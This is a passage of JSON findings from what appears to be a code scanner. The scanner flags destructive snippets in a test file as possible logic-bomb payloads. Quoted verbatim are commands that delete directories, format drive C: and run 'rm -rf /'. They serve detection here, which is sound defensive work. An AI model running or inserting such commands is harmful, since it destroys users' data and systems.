    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-13T22:21:33.607547"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "shutil.rmtree('/important_data')",
    "column": 5,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.619544",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "test_suspicious.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\test_suspicious.py",
    "id": "3ac9b0eb-287f-4134-ad7b-32cc197abc32",
    "last_modified": "",
    "line_number": 12,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-13T22:21:33.619544"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "os.system('format C:')",
    "column": 8,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.620546",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "test_suspicious.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\test_suspicious.py",
    "id": "d61c98ab-1783-49f3-b89a-2e5f71276120",
    "last_modified": "",
    "line_number": 13,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "System formatting - Complete data destruction",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-13T22:21:33.620546"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "subprocess.call(['rm', '-rf', '/'])",
    "column": 5,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.622544",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "test_suspicious.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\test_suspicious.py",
    "id": "202ab765-c874-407d-9ec4-aedfe5ada9ba",
    "last_modified": "",
    "line_number": 14,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-13T22:21:33.622544"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "os.remove('/critical_file.txt')",
    "column": 5,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.623544",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "test_suspicious.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\test_suspicious.py",
    "id": "20709486-ebbf-47a2-b174-3e8e9b984e97",
    "last_modified": "",
    "line_number": 28,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "File/directory deletion - Data loss risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-13T22:21:33.623544"
  }
]